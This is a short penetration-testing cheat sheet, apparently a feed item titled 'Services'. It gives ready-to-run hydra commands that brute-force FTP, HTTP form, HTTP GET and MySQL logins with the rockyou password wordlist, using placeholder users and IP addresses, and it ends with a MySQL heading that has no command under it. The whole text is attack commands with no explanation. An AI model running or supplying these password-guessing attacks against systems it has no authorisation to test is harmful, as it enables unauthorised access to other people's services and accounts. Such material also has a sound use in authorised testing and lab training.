item.title: Services
item.description: Services FTP - Known user and rockyou password list hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp HTTP - hydra http-post request known user hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "<Login Page>:<Request Body>:<Error Message>" -v -V HTTP - hydra http-get request known users hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I MYSQL - Known user and rockyou password list hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip mysql MYSQL - Username list and rockyou password list
